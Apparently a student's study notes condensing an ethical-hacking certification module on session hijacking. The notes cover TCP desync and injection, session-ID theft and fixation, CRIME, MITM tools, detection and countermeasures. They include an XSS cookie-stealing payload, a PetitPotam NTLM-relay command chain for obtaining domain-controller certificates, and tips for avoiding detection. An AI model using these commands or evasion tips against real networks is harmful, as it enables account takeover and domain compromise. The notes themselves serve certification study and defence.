# CEHv13 Module 11 — Session Hijacking (technique synthesis)

Source: `CEHv13 - Module 11 - Session Hijacking hide01.ir.pdf` (78 pages, scanned → OCR via
pdftoppm+tesseract, `pdftotext` yields only `hide01.ir` watermark noise).

## 1. Core attack loop (network-level)

Track → Desync → Inject → Predict ID → take over (p.1550-1551):
1. **Track**: sniff or Nmap-scan for a target with an easy-to-predict TCP sequence.
2. **Desync**: break the victim's connection without alerting it — flood server with null data
   to advance its SEQ/ACK while the victim's side doesn't register the increment, or send
   RST+SYN (same port, new sequence) to silently force a resync. Avoid FIN — it triggers an
   ACK storm that exposes the attack.
3. **Inject**: send packets to the server as the victim.
4. Needs: victim IP, port, and the current **sequence number** (the only moving part — IP/port
   stay static for the whole session).

Spoofing ≠ hijacking: spoofing starts a *new* session with stolen creds (no SEQ guess needed);
hijacking takes over an *existing* one (SEQ guess required, unless session is encrypted — SSL/
PPTP block this entirely since the attacker can't join the key exchange).

## 2. Application-level: compromising the session ID

| Technique | Mechanism / exact payload |
|---|---|
| Sniffing | Wireshark / Riverbed Packet Analyzer Plus on client↔server HTTP, pull ID straight from cookie/URL/body |
| Brute force | DSL line ≈ 1000 IDs/sec; viable when token space is small or algorithm non-random |
| Sequential-token prediction | `JBEX1001`,`JBEX1002` → next is `JBEX1003` |
| Timestamp-token prediction | `user123-20240611T1234` → guessable if format+time known |
| Weak PRNG | known/guessable seed (e.g. system time) → replicate token stream |
| XSS → cookie theft | `<SCRIPT>alert(document.cookie);</SCRIPT>` via crafted link → exfil `JSESSIONID` |
| CSRF (session riding) | host a form prefilled with the malicious request, victim's authenticated browser submits it — exploits site→browser trust (inverse of XSS) |
| Session replay | eavesdrop auth handshake, replay captured token to server |
| **Session fixation** | 3 phases: attacker gets a valid SID from target → sends victim a link with that SID (`http://site.com/?SID=xxx`) → waits for victim to authenticate under it → reuses it. Vectors: URL param, hidden form field, cookie |
| **Session donation** | inverse of fixation — attacker donates **own** SID to victim, victim enters sensitive data (payment info, creds) into attacker's account, attacker logs in and harvests it |
| MITM / MITB | MITM: split TCP into client→attacker + attacker→server legs, read/modify/inject. MITB: Trojan browser extension hooks DOM on form submit, rewrites values, shows victim the original receipt — bypasses SSL/PKI/2FA because client-side everything looks normal |
| Hijacking via proxy | phishing link → attacker's server transparently proxies to the real site, capturing everything in transit |
| **CRIME** | exploits TLS/SPDY DEFLATE compression: sniff HTTPS (e.g. via ARP spoof), send repeated requests with stolen cookie + random prefix, watch **compressed response length** shrink as prefix chars match real cookie → recover it byte by byte. Detection tool: CrimeCheck |
| **Forbidden attack** | MITM exploiting AES-GCM **nonce reuse** in TLS handshake to derive auth keys, then inject forged JS/fields into the hijacked HTTPS session |
| **PetitPotam (AD/NTLM relay)** | see below |

### PetitPotam (p.1591-1592)
Coerce a Domain Controller into authenticating to attacker's SMB server via MS-EFSRPC, relay
NTLM to AD CS for a privileged cert:
```bash
certutil.exe                                                  # find the CA
ntlmrelayx.py -t <CA web-enrollment URL> -smb2support --adcs --template DomainController
python3 PetitPotam.py -d <CA name> -u <user> -p <pass> <listener-IP> <DC-IP>
python3 PetitPotam.py <attacker-IP> <DC-IP>                    # no creds, if DC vulnerable
Rubeus.exe asktgt /outfile.kirbi /dc:<DC-IP> /domain:<domain> /user:<user> /ptt /certificate:<NTLM hash>
```

## 3. Network-level hijacking

- **TCP/IP hijacking**: sniff victim's connection, send spoofed packet with predicted SEQ before
  victim sends theirs → server resyncs to attacker, victim's connection hangs. Requires same
  network as victim (target server can be anywhere). Breaks OTP-protected systems.
- **IP spoofing / source-routed packets**: force packet path so replies return to attacker even
  off-segment; inject forged packets before the real host responds, desyncing SEQ/ACK.
- **RST hijacking**: inject RST with spoofed source IP + correct ACK to kill victim's connection.
  Tools: **Colasoft Packet Builder** (craft), **tcpdump** (calibrate SEQ/ACK).
- **Blind hijacking**: inject commands (e.g. add account) without seeing the response — needs
  correct NSN guess; no visibility → prefer MITM if possible.
- **UDP hijacking**: no sequencing in UDP — forge the server's reply and beat the real one back
  to the client; pair with MITM to suppress the real reply.
- **MITM via forged ICMP / ARP spoofing**: fake ICMP error → forces reroute through attacker;
  or poison ARP cache with forged replies → same effect.

## 4. Tools (offensive)

| Tool | Role | Source |
|---|---|---|
| Hetty | MITM HTTP proxy, request forge/replay, intercept+edit | github.com |
| Caido | HTTP interception/audit toolkit | caido.io |
| bettercap | network MITM framework (Go) | bettercap.org |
| OWASP ZAP | intercepting proxy | zaproxy.org |
| sslstrip | HTTPS→HTTP downgrade for MITM | pypi.org |
| Burp Suite | intercept/manipulate HTTP | portswigger.net |
| Fiddler | web debug proxy, HTTPS decrypt, in-flight request edit | telerik.com |

## 5. Detection

- **Symptoms**: abnormal traffic burst, server overload (duplicate client+hijacker requests).
- **Manual**: Wireshark / SteelCentral Packet Analyzer + **forced ARP entry** (swap compromised
  host's MAC in server's ARP cache) — trigger on repeated ARP updates, mismatched client/server
  MACs, or ACK storms.
- **Automatic**: IDS (alert on signature) / IPS (block on match).
- Detection platforms cited: USM Anywhere, Checkpoint Quantum IPS, SolarWinds SEM, IBM Security
  Network IPS, LogRhythm.

## 6. Countermeasures (condensed)

- Regenerate session ID post-login; accept only server-issued IDs; never put ID in URL/query
  string; `HttpOnly` + `Secure` + `SameSite` on cookies.
- HSTS (force HTTPS), disable HTTP compression (anti-CRIME), DNS-over-HTTPS (anti-MITM on
  resolution), IPsec (AH/ESP, transport or tunnel mode) for VPN/remote-access traffic.
- Token Binding: client holds a per-connection keypair, signs with private key — captured
  signature is useless for a different connection.
- Switch (not hub) networks + ARPwatch/IDS to blunt ARP spoofing; anti-spoof rules on gateways;
  MFA/Kerberos for strong auth; absolute session timeout independent of activity.
- Prevention/test tooling cited: Checkmarx One SAST (static analysis), Nessus, Invicti, Wapiti.

## 7. Pitfalls

- FIN-based desync reveals itself via ACK storm — use RST+SYN or null-data flood instead.
- Encrypted sessions (SSL/TLS/PPTP) defeat every network-level technique above at once — that's
  the one structural fix; ARPwatch/IDS/switching only treat symptoms.
- Blind SEQ-prediction is largely dead against modern OSes (random ISN) — MITM/ARP-spoof routes
  are the practical path now, not raw sequence guessing.
